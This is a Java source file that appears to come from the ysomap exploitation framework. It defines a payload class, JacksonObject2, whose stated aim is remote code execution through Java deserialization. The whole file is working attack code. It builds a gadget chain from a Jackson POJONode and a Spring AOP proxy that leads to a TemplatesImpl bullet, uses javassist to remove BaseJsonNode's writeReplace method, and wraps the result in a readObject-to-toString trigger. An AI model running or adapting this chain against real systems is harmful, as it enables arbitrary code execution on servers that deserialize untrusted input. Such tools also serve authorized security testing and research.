package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import javax.xml.transform.Templates;

/**
 * @author whocansee
 * @since 2023/10/7
 * <a href="https://xz.aliyun.com/t/12846">...</a>
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee, Authors.TYSKILL })
@Targets({Targets.JDK})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Dependencies({"spring-aop", "jackson>=2.10.0"})
@Details("jackson & spring-aop trigger templates to rce")
public class JacksonObject2 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        javassist.ClassPool pool = javassist.ClassPool.getDefault();
        javassist.CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        javassist.CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(ctMethod);
        ctClass.toClass(); // 覆盖对象

        Object proxy = PayloadHelper.makeSpringAOPProxy(Templates.class, obj);
        POJONode node = new POJONode(proxy);
        return PayloadHelper.makeReadObjectToStringTrigger(node);
    }
}